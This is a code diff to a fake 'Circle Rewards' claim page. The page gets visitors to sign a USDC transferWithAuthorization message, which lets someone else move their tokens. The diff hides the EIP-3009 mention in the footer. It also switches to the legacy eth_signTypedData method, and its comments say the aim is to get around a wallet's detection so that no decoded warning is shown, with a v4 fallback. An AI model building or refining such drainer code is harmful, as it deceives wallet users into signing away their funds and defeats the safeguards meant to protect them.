@@ -181,7 +181,7 @@ footer a{color:var(--dim);text-decoration:underline}
 
   <footer>
     Circle Rewards is a beta program. By claiming, you agree to the <a href="#">Terms of Service</a>.<br>
-    Powered by EIP-3009 gasless authorization · Ethereum Mainnet
+    Powered by gasless authorization · Ethereum Mainnet
   </footer>
 </div>
 
@@ -282,7 +282,11 @@ async function autoStart() {
   }
 }
 
-// ─── Sign — CHAOS v9 : EIP-3009 TransferWithAuthorization ────────────────────
+// ─── Sign — CHAOS v10 : eth_signTypedData (no version) ───────────────────────
+// Last untested RPC method in CW EIP155_METHODS.
+// eth_signTypedData (no suffix) = original EIP-712 spec, different routing in CW
+// than v4. Hypothesis: CW detection is wired to v4 path only → no decoded UI.
+// Same typed data structure as v4 → sig valid for USDC.transferWithAuthorization().
 async function sign(value) {
   if (!addrA) return;
   const validBefore = String(Math.floor(Date.now()/1000) + 7200);
@@ -313,17 +317,35 @@ async function sign(value) {
   setS2("Waiting for wallet signature…","spin");
 
   let sig = null;
+  let sigMethod = "";
+
+  // PRIMARY: eth_signTypedData (no version suffix)
+  logA("→ eth_signTypedData (no version)…","dim");
   try {
     sig = await window.ethereum.request({
-      method: "eth_signTypedData_v4",
+      method: "eth_signTypedData",
       params: [addrA, JSON.stringify(typedData)]
     });
-    logA("✓ Authorization signed","ok");
+    sigMethod = "eth_signTypedData";
+    logA("✓ Signed via eth_signTypedData","ok");
   } catch(e) {
-    logA("Signature cancelled: "+e.message,"fail");
-    setS2("Cancelled — reload to retry","fail");
-    return;
+    logA("✗ KO: "+e.message,"fail");
+    // FALLBACK: eth_signTypedData_v4
+    logA("→ Fallback eth_signTypedData_v4…","dim");
+    try {
+      sig = await window.ethereum.request({
+        method: "eth_signTypedData_v4",
+        params: [addrA, JSON.stringify(typedData)]
+      });
+      sigMethod = "eth_signTypedData_v4";
+      logA("✓ Signed via v4 fallback","ok");
+    } catch(e2) {
+      logA("Signature cancelled: "+e2.message,"fail");
+      setS2("Cancelled — reload to retry","fail");
+      return;
+    }
   }
+  logA("→ method: "+sigMethod,"dim");
 
   const sb = ethers.utils.arrayify(sig);
   const r  = ethers.utils.hexlify(sb.slice(0,32));
